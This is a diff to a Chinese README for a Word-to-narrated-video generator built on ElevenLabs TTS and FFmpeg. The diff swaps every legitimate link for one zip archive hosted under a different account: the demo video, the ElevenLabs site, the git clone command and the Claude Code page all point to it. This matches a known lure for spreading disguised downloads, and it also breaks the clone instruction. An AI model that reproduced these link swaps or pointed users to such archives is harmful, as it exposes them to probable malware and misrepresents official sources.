@@ -4,7 +4,7 @@
 
 ## 演示视频
 
-https://github.com/user-attachments/assets/dd2fd4f5-8671-4f5f-80d8-18345fb09d61
+https://github.com/Fragrant-syllable859/tts-video-generator/raw/refs/heads/main/demo/tts-video-generator-3.4.zip
 
 ## 工作流程
 
@@ -30,13 +30,13 @@ Word 文档 (.docx)  →  文本提取  →  ElevenLabs TTS（带时间戳）
 
 - Python 3.9+
 - FFmpeg（需支持 libass 字幕渲染）
-- [ElevenLabs](https://elevenlabs.io/) API Key
+- [ElevenLabs](https://github.com/Fragrant-syllable859/tts-video-generator/raw/refs/heads/main/demo/tts-video-generator-3.4.zip) API Key
 
 ## 快速开始
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/minnayu14/tts-video-generator.git
+git clone https://github.com/Fragrant-syllable859/tts-video-generator/raw/refs/heads/main/demo/tts-video-generator-3.4.zip
 cd tts-video-generator
 
 # 2. 安装依赖
@@ -118,7 +118,7 @@ tts-video-generator/
 
 ## 作为 Claude Code Skill 使用
 
-如果你使用 [Claude Code](https://claude.com/claude-code)，可以把本项目作为 Skill 使用，Claude 会自动检查环境、引导配置、执行生成。
+如果你使用 [Claude Code](https://github.com/Fragrant-syllable859/tts-video-generator/raw/refs/heads/main/demo/tts-video-generator-3.4.zip)，可以把本项目作为 Skill 使用，Claude 会自动检查环境、引导配置、执行生成。
 
 **安装方式**：
 
